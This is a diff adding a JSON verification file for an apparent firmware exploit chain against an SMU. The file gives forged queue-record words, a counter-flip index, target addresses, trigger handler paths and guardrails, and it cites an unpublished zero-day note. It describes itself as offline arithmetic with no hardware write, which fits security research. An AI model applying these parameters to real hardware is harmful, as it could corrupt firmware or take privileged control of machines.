@@ -1,0 +1,67 @@
+{
+  "scope": "offline arithmetic on the real SMU body; no hardware, no firmware write",
+  "body_sha256": "cae8617c572613b610d24845cdb791fc66e8604e3ab1195d0ac3268b39e59f37",
+  "geometry_verified": {
+    "bss_window_zero_0x188A0_0x1B000": true,
+    "first_nonzero_after_window": "0x1b000",
+    "q0_tag_sum_is_0x02000000": true,
+    "r1_base": "0x19034",
+    "q0_count_addr": "0x1901c",
+    "q0_table": "0x18e20"
+  },
+  "invariants": {
+    "appends_used": 120,
+    "counter_final": 120,
+    "forged_record_q0_index": 88,
+    "count_flip_word": "entry[3]=1 lands on q0 count 0x1901C",
+    "filler_mask_0_noop": true
+  },
+  "plans": {
+    "Q0_WINDOW_PROBE_0x02000060": {
+      "append_count": 120,
+      "forged_at_index": 88,
+      "count_flip_at_index": 119,
+      "check": {
+        "applied_target": "0x2000060",
+        "applied_write": "(0x0 & 0xffffffff) | (old & ~0xffffffff)",
+        "forged_record_words": [
+          "0x2000060",
+          "0x0",
+          "0xffffffff",
+          "1"
+        ],
+        "q0_count_after_stage": 1,
+        "filler_records_are_noop": true,
+        "trigger": "any later Q2 command whose handler chain reaches FUN_0002D4E0 (callers 0x2D308/0x2D35C, VCN/clock paths 0x1F814/0x1FAF0) applies the record"
+      }
+    },
+    "DRYRUN_NOOP": {
+      "append_count": 120,
+      "forged_at_index": 88,
+      "count_flip_at_index": 119,
+      "check": {
+        "applied_target": "0x2000060",
+        "applied_write": "(0x0 & 0x0) | (old & ~0x0)",
+        "forged_record_words": [
+          "0x2000060",
+          "0x0",
+          "0x0",
+          "1"
+        ],
+        "q0_count_after_stage": 1,
+        "filler_records_are_noop": true,
+        "trigger": "any later Q2 command whose handler chain reaches FUN_0002D4E0 (callers 0x2D308/0x2D35C, VCN/clock paths 0x1F814/0x1FAF0) applies the record"
+      }
+    }
+  },
+  "guardrails": [
+    "NEVER target the fuse controller or any one-time-programmable space: irreversible",
+    "one-shot per boot: ring counters persist in SRAM until power cycle",
+    "appends beyond #119 trash the counter block (entry #120 overlaps it)",
+    "arg0 bound (decompiled DAT_00017C5C=0x1FFFFF) caps the applier windows at 2 MiB each: q0 0x02000000..0x021FFFFF, q1 0x02400000..0x025FFFFF; the args block 0x032000E8 and PSP APB 0x02B10060 are OUTSIDE both windows"
+  ],
+  "sources": [
+    "docs/research/2026-09-23-smu-chain-development.md (sections 1-2, 6)",
+    "docs/research/2026-09-19-zero-day-confirmation.md (ZD-1 transport)"
+  ]
+}
